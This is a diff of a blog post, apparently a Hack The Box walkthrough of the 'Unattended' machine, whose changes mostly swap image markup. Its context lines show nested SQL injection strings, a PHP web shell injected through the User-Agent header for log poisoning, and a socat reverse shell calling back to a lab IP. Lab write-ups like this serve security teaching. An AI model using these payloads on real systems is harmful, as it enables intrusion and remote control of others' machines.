@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Unattended, a retired vulnerable
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -71,9 +71,9 @@ PORT    STATE SERVICE  REASON         VERSION
 
 Nothing much is going on for the `http` service, to be honest. Let's take a look at `https` service. But, before we do that, add `www.nestedflanders.htb` to `/etc/hosts.`
 
-<a class="image-popup">
-![88c3b276.png](/assets/images/posts/unattended-htb-walkthrough/88c3b276.png)
-</a>
+
+{% include image.html image_alt="88c3b276.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/88c3b276.png" %}
+
 
 WTF. A default page??!!
 
@@ -112,45 +112,45 @@ Let's take a look at `dev`, `index.php`, `server-status`.
 
 _`dev`_
 
-<a class="image-popup">
-![d3d0ffa4.png](/assets/images/posts/unattended-htb-walkthrough/d3d0ffa4.png)
-</a>
+
+{% include image.html image_alt="d3d0ffa4.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/d3d0ffa4.png" %}
+
 
 Hmm. I wonder what that means. See nginx [off-by-slash](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) fail later.
 
 _`index.php`_
 
-<a class="image-popup">
-![2ad7d697.png](/assets/images/posts/unattended-htb-walkthrough/2ad7d697.png)
-</a>
+
+{% include image.html image_alt="2ad7d697.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/2ad7d697.png" %}
+
 
 Interesting. As you click through the hyperlinks, each one shows a different message.
 
 _main_
 
-<a class="image-popup">
-![b5fd0ff2.png](/assets/images/posts/unattended-htb-walkthrough/b5fd0ff2.png)
-</a>
+
+{% include image.html image_alt="b5fd0ff2.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/b5fd0ff2.png" %}
+
 
 _about_
 
-<a class="image-popup">
-![7d826cc0.png](/assets/images/posts/unattended-htb-walkthrough/7d826cc0.png)
-</a>
+
+{% include image.html image_alt="7d826cc0.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/7d826cc0.png" %}
+
 
 _contact_
 
-<a class="image-popup">
-![f6ba9790.png](/assets/images/posts/unattended-htb-walkthrough/f6ba9790.png)
-</a>
+
+{% include image.html image_alt="f6ba9790.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/f6ba9790.png" %}
+
 
 Notice the IDs for each of those pages? They are SMTP port numbers. Not surprising, the file name of the GIF is `787c75233b93aa5e45c3f85d130bfbe7.gif`, which is MD5 hash of the word `smtp`.
 
 _`server-status`_
 
-<a class="image-popup">
-![e106e743.png](/assets/images/posts/unattended-htb-walkthrough/e106e743.png)
-</a>
+
+{% include image.html image_alt="e106e743.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/e106e743.png" %}
+
 
 This is absolutely surprising for me because `server-status` is usually `403 - Forbidden`. I can probably run a script to monitor incoming requests to the Apache instance.
 
@@ -338,9 +338,9 @@ Since I couldn't get the first query structure to work, I'm assuming it's the se
 ' UNION ALL SELECT "contact" -- endgame
 ```
 
-<a class="image-popup">
-![e913b3ff.png](/assets/images/posts/unattended-htb-walkthrough/e913b3ff.png)
-</a>
+
+{% include image.html image_alt="e913b3ff.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/e913b3ff.png" %}
+
 
 Now that I can control the outcome for the first query, I'm going to "nest" another UNION-based injection to bypass the second query and control the file path.
 
@@ -348,9 +348,9 @@ Now that I can control the outcome for the first query, I'm going to "nest" anot
 ' UNION ALL SELECT "' UNION ALL SELECT '/etc/passwd' -- avengers" -- endgame
 ```
 
-<a class="image-popup">
-![b81b10c0.png](/assets/images/posts/unattended-htb-walkthrough/b81b10c0.png)
-</a>
+
+{% include image.html image_alt="b81b10c0.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/b81b10c0.png" %}
+
 
 Awesome but I need a better display. Towards that end, I wrote a `bash` script to help me read files.
 
@@ -380,21 +380,21 @@ curl -b cookie \
 rm cookie
 ```
 
-<a class="image-popup">
-![d1d6968e.png](/assets/images/posts/unattended-htb-walkthrough/d1d6968e.png)
-</a>
+
+{% include image.html image_alt="d1d6968e.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/d1d6968e.png" %}
+
 
 Let's see if we can read the nginx configuration file.
 
-<a class="image-popup">
-![f8182226.png](/assets/images/posts/unattended-htb-walkthrough/f8182226.png)
-</a>
+
+{% include image.html image_alt="f8182226.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/f8182226.png" %}
+
 
 If I can read any of the log files, then it's pretty clear that PHP log poisoning is next.
 
-<a class="image-popup">
-![af59bd59.png](/assets/images/posts/unattended-htb-walkthrough/af59bd59.png)
-</a>
+
+{% include image.html image_alt="af59bd59.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/af59bd59.png" %}
+
 
 ## Low-Privilege Shell
 
@@ -406,9 +406,9 @@ Host: www.nestedflanders.htb
 User-Agent: <style type='text/css'>body { background-color: black; } #endgame { background-color: white; color: black; }</style><div id='endgame'><pre><?php echo shell_exec($_GET[0]); ?></pre></div>
 ```
 
-<a class="image-popup">
-![9be25949.png](/assets/images/posts/unattended-htb-walkthrough/9be25949.png)
-</a>
+
+{% include image.html image_alt="9be25949.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/9be25949.png" %}
+
 
 Yes, I can execute remote commands.
 
@@ -416,17 +416,17 @@ Yes, I can execute remote commands.
 
 Next, we'll get that reverse shell.
 
-<a class="image-popup">
-![1f8e4b9f.png](/assets/images/posts/unattended-htb-walkthrough/1f8e4b9f.png)
-</a>
+
+{% include image.html image_alt="1f8e4b9f.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/1f8e4b9f.png" %}
+
 
 Guess what, `socat` is available.
 
 _Firewall rules: only egress traffic to 80/tcp and 443/tcp is allowed._
 
-<a class="image-popup">
-![fe618dc8.png](/assets/images/posts/unattended-htb-walkthrough/fe618dc8.png)
-</a>
+
+{% include image.html image_alt="fe618dc8.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/fe618dc8.png" %}
+
 
 _On my attacking machine_
 
@@ -440,9 +440,9 @@ _On the browser address bar (need to urlencode)_
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.12.61:80
 ```
 
-<a class="image-popup">
-![fa385a7d.png](/assets/images/posts/unattended-htb-walkthrough/fa385a7d.png)
-</a>
+
+{% include image.html image_alt="fa385a7d.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/fa385a7d.png" %}
+
 
 ## Privilege Escalation
 
@@ -464,15 +464,15 @@ $ mysql -unestedflanders -p$PW -e "update neddy.config set option_value = '/var/
 
 A minute later, `guly`'s shell appeared!
 
-<a class="image-popup">
-![e0502e47.png](/assets/images/posts/unattended-htb-walkthrough/e0502e47.png)
-</a>
+
+{% include image.html image_alt="e0502e47.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/e0502e47.png" %}
+
 
 The `user.txt` is in `guly`'s home directory.
 
-<a class="image-popup">
-![9fe16106.png](/assets/images/posts/unattended-htb-walkthrough/9fe16106.png)
-</a>
+
+{% include image.html image_alt="9fe16106.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/9fe16106.png" %}
+
 
 Moving on to `root`.
 
@@ -480,57 +480,57 @@ Moving on to `root`.
 
 Notice that `guly` is in the `grub` group. This is certainly unusual. Searching the file system for everything to do with the `grub` group led to this.
 
-<a class="image-popup">
-![7b97fe9a.png](/assets/images/posts/unattended-htb-walkthrough/7b97fe9a.png)
-</a>
+
+{% include image.html image_alt="7b97fe9a.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/7b97fe9a.png" %}
+
 
 That's a first. I'd never taken a good at the init ram disk (or `initrd`) before. Time to put on my forensic analyst hat. What kind of file am I dealing with?
 
-<a class="image-popup">
-![88a06e2b.png](/assets/images/posts/unattended-htb-walkthrough/88a06e2b.png)
-</a>
+
+{% include image.html image_alt="88a06e2b.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/88a06e2b.png" %}
+
 
 Let's copy the file to `guly`'s home directory because the rest of the `tmpfs` are all `nosuid`, `nodev` and `noexec`.
 
-<a class="image-popup">
-![dcd33fdf.png](/assets/images/posts/unattended-htb-walkthrough/dcd33fdf.png)
-</a>
+
+{% include image.html image_alt="dcd33fdf.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/dcd33fdf.png" %}
+
 
 So, `initrd.img` is a `cpio` archive. We can use `cpio` to extract it.
 
-<a class="image-popup">
-![15b2f294.png](/assets/images/posts/unattended-htb-walkthrough/15b2f294.png)
-</a>
+
+{% include image.html image_alt="15b2f294.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/15b2f294.png" %}
+
 
 Searching for the string `guly` provides us with the next hint.
 
-<a class="image-popup">
-![74550885.png](/assets/images/posts/unattended-htb-walkthrough/74550885.png)
-</a>
+
+{% include image.html image_alt="74550885.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/74550885.png" %}
+
 
 Let's see what goes before and after that line.
 
-<a class="image-popup">
-![cbfa7dec.png](/assets/images/posts/unattended-htb-walkthrough/cbfa7dec.png)
-</a>
+
+{% include image.html image_alt="cbfa7dec.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/cbfa7dec.png" %}
+
 
 Hmm. What do we have here? Could that be `root`'s password? Alas, it's not. But, what about the weird `/sbin/uinitrd`? It's certainly not your standard command too. Let's try to run that.
 
-<a class="image-popup">
-![49e42dc8.png](/assets/images/posts/unattended-htb-walkthrough/49e42dc8.png)
-</a>
+
+{% include image.html image_alt="49e42dc8.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/49e42dc8.png" %}
+
 
 Could this finally be `root`'s password. There's only one way to find out.
 
-<a class="image-popup">
-![04bb6fd6.png](/assets/images/posts/unattended-htb-walkthrough/04bb6fd6.png)
-</a>
+
+{% include image.html image_alt="04bb6fd6.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/04bb6fd6.png" %}
+
 
 Perfect. Time to claim the prize.
 
-<a class="image-popup">
-![cd286213.png](/assets/images/posts/unattended-htb-walkthrough/cd286213.png)
-</a>
+
+{% include image.html image_alt="cd286213.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/cd286213.png" %}
+
 
 :dancer:
 
@@ -538,9 +538,9 @@ Perfect. Time to claim the prize.
 
 Recall the message "dev site has been moved to his own server" when navigating to `/dev`? You don't see the `dev` vhost or subdomain right? It turns out to be a subtle hint at nginx's "off-by-slash" misconfiguration; the `alias` directive defines a replacement for `/dev`.
 
-<a class="image-popup">
-![3232ce4f.png](/assets/images/posts/unattended-htb-walkthrough/3232ce4f.png)
-</a>
+
+{% include image.html image_alt="3232ce4f.png" image_src="/b3c66ec8-3480-4340-af69-0fd4aba980e9/3232ce4f.png" %}
+
 
 It's almost trivial to exploit it to read files.
 
